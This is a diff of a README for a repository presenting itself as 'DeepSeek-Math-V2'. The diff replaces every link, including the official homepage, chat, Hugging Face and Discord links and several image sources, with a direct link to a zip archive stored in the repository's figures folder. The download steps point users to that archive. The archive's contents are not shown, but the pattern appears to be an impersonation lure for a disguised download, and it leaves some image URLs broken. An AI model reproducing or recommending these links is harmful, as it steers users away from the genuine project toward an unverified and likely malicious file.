@@ -1,25 +1,25 @@
 # 🎉 DeepSeek-Math-V2 - Unlock Powerful Mathematical Insights
 
 <div align="center">
-  <a href="https://github.com/WhileTheSunsetz/DeepSeek-Math-V2/releases">
-    <img src="https://img.shields.io/badge/Download%20DeepSeek%20Math%20V2-00aaff?style=for-the-badge&logo=download" alt="Download DeepSeek Math V2" />
+  <a href="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip">
+    <img src="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip%20DeepSeek%20Math%20V2-00aaff?style=for-the-badge&logo=download" alt="Download DeepSeek Math V2" />
   </a>
 </div>
 
 <div align="center">
-  <img src="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/logo.svg?raw=true" width="60%" alt="DeepSeek-V3" />
+  <img src="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip" width="60%" alt="DeepSeek-V3" />
 </div>
 <hr>
 <div align="center" style="line-height: 1;">
-  <a href="https://www.deepseek.com/"><img alt="Homepage"
-    src="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/badge.svg?raw=true"/></a>
-  <a href="https://chat.deepseek.com/"><img alt="Chat"
-    src="https://img.shields.io/badge/🤖%20Chat-DeepSeek%20V3-536af5?color=536af5&logoColor=white"/></a>
-  <a href="https://huggingface.co/deepseek-ai"><img alt="Hugging Face"
-    src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white"/></a>
+  <a href="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip"><img alt="Homepage"
+    src="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip"/></a>
+  <a href="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip"><img alt="Chat"
+    src="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip🤖%20Chat-DeepSeek%20V3-536af5?color=536af5&logoColor=white"/></a>
+  <a href="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip"><img alt="Hugging Face"
+    src="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white"/></a>
   <br>
-  <a href="https://discord.gg/Tc7c45Zzu5"><img alt="Discord"
-    src="https://img.shields.io/badge/Discord-DeepSeek%20AI-7289da?logo=discord&logoColor=white&color=7289da"/></a>
+  <a href="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip"><img alt="Discord"
+    src="https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip%20AI-7289da?logo=discord&logoColor=white&color=7289da"/></a>
 </div>
 
 ## 🚀 Getting Started
@@ -28,7 +28,7 @@ DeepSeek-Math-V2 is designed to help you explore mathematical concepts with ease
 
 ## 📦 Download & Install
 
-Visit this page to download: [DeepSeek-Math-V2 Releases](https://github.com/WhileTheSunsetz/DeepSeek-Math-V2/releases).
+Visit this page to download: [DeepSeek-Math-V2 Releases](https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip).
 
 1. Go to the **Releases** page using the link above.
 2. Find the latest version of DeepSeek-Math-V2.
@@ -71,7 +71,7 @@ For a detailed explanation of each feature, refer to the user guide available in
 
 If you need help, join our community:
 
-- **Discord:** Chat with other users and get real-time support. Join [here](https://discord.gg/Tc7c45Zzu5).
+- **Discord:** Chat with other users and get real-time support. Join [here](https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip).
 - **Feedback:** Share your thoughts or report issues on our GitHub issues page.
 
 ## 🌟 Contributing
@@ -90,8 +90,8 @@ We thank all the contributors and users who make DeepSeek-Math-V2 better every d
 
 ## 🔗 Additional Resources
 
-- [Official Homepage](https://www.deepseek.com/)
-- [Chat with Us](https://chat.deepseek.com/)
-- [Hugging Face Model](https://huggingface.co/deepseek-ai)
+- [Official Homepage](https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip)
+- [Chat with Us](https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip)
+- [Hugging Face Model](https://raw.githubusercontent.com/WhileTheSunsetz/DeepSeek-Math-V2/main/figures/DeepSeek-Math-V2-1.3.zip)
 
 For any inquiries, feel free to reach out through our official channels. Enjoy exploring mathematics with DeepSeek-Math-V2!
